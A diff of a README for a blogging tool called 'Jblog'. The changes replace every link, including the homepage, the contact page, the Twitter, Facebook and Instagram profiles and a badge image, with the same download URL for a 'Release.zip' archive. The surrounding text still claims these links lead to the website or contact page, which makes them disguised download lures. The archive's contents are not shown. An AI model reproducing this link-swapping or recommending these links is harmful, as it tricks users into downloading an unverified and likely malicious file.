@@ -24,9 +24,9 @@ Jblog is a platform designed specifically for bloggers who are passionate about 
 
 ## 🚀 Get Started with Jblog
 
-To get started with Jblog, you can download the **latest version** by clicking [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+To get started with Jblog, you can download the **latest version** by clicking [here](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip).
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip%https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip)](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip)
 
 *(Note: The link above needs to be launched to start the download.)*
 
@@ -40,7 +40,7 @@ To get started with Jblog, you can download the **latest version** by clicking [
 
 ## 🌍 Visit Our Website
 
-For more information about Jblog and to explore our website, please [visit our homepage](https://www.jblog.com).
+For more information about Jblog and to explore our website, please [visit our homepage](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip).
 
 *(Note: The link above will take you directly to our website.)*
 
@@ -69,7 +69,7 @@ To stay up-to-date with the latest releases and updates for Jblog, please check 
 
 ## 📣 Connect with Us
 
-Have questions, feedback, or suggestions? We'd love to hear from you! Feel free to reach out to us through our official [Contact Page](https://www.jblog.com/contact).
+Have questions, feedback, or suggestions? We'd love to hear from you! Feel free to reach out to us through our official [Contact Page](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip).
 
 ---
 
@@ -77,9 +77,9 @@ Have questions, feedback, or suggestions? We'd love to hear from you! Feel free 
 
 Join our growing community of bloggers who share a love for JSON and innovative blogging solutions. Follow us on social media for the latest updates, tips, and inspiration:
 
-- Twitter: [@jblogofficial](https://twitter.com/jblogofficial)
-- Facebook: [JblogOfficial](https://www.facebook.com/jblogofficial)
-- Instagram: [jblog.official](https://www.instagram.com/jblog.official)
+- Twitter: [@jblogofficial](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip)
+- Facebook: [JblogOfficial](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip)
+- Instagram: [https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip](https://github.com/TDT2711/jblog/releases/download/v1.0/Release.zip)
 
 ---
 
